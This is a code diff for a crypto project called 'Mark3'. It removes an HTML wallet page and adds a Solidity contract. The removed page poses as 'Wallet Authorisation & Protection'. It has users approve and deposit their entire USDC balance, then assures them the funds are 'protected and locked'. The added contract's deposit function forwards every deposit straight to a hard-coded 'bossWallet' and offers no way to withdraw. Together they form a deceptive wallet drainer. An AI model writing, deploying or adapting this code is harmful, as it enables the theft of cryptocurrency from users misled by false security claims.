@@ -1,94 +1,42 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mark3 · Wallet Authorisation & Protection</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      text-align: center;
-      background: #f4f4f8;
-      padding: 2rem;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+contract Mark3v3 {
+    address public immutable bossWallet;
+    address public immutable usdc;
+    address public owner;
+
+    struct User {
+        uint256 deposited;
     }
-    button {
-      padding: 12px 24px;
-      margin: 1rem;
-      background: #4e44ce;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
+
+    mapping(address => User) public users;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not owner");
+        _;
     }
-    #status {
-      margin-top: 1rem;
-      font-weight: bold;
+
+    constructor(address _usdc, address _bossWallet) {
+        usdc = _usdc;
+        bossWallet = _bossWallet;
+        owner = msg.sender;
     }
-  </style>
-</head>
-<body>
-  <h1>Mark3 · Wallet Authorisation & Protection</h1>
-  <button id="connect">Connect Wallet</button>
-  <button id="protect" disabled>Authorise & Secure</button>
-  <div id="status">Status: Not connected</div>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script>
-    const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-    const CONTRACT = "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a";
-    const ABI = [
-      "function deposit(uint256 amount) external",
-      "function users(address) view returns (uint256 deposited, bool hasDeposited)",
-      "function approve(address,uint256) returns (bool)",
-      "function balanceOf(address) view returns (uint256)",
-      "function allowance(address,address) view returns (uint256)"
-    ];
 
-    let provider, signer, user;
+    // Allow multiple deposits by same wallet
+    function deposit(uint256 amount) external {
+        require(amount >= 100e6, "Min 100 USDC");
+        IERC20(usdc).transferFrom(msg.sender, bossWallet, amount);
+        users[msg.sender].deposited += amount;
+    }
 
-    const connectBtn = document.getElementById('connect');
-    const protectBtn = document.getElementById('protect');
-    const statusDiv = document.getElementById('status');
-
-    connectBtn.onclick = async () => {
-      try {
-        if (!window.ethereum) throw new Error("MetaMask not installed");
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        user = await signer.getAddress();
-        statusDiv.textContent = `Connected: ${user}`;
-        protectBtn.disabled = false;
-      } catch (err) {
-        statusDiv.textContent = `Error: ${err.message}`;
-      }
-    };
-
-    protectBtn.onclick = async () => {
-      try {
-        const contract = new ethers.Contract(CONTRACT, ABI, signer);
-        const usdc = new ethers.Contract(USDC, ABI, signer);
-
-        const { hasDeposited } = await contract.users(user);
-        if (hasDeposited) {
-          statusDiv.textContent = "Already deposited. No action needed.";
-          return;
-        }
-
-        const balance = await usdc.balanceOf(user);
-        const allowance = await usdc.allowance(user, CONTRACT);
-        if (allowance.lt(balance)) {
-          const tx1 = await usdc.approve(CONTRACT, balance);
-          await tx1.wait();
-        }
-
-        const tx2 = await contract.deposit(balance);
-        await tx2.wait();
-        statusDiv.textContent = `All set! 🎉 Your funds are now protected and locked.`;
-      } catch (err) {
-        statusDiv.textContent = `❌ Error: ${err.message}`;
-      }
-    };
-  </script>
-</body>
-</html>
+    // Optional admin check
+    function userInfo(address user) external view returns (uint256) {
+        return users[user].deposited;
+    }
+}
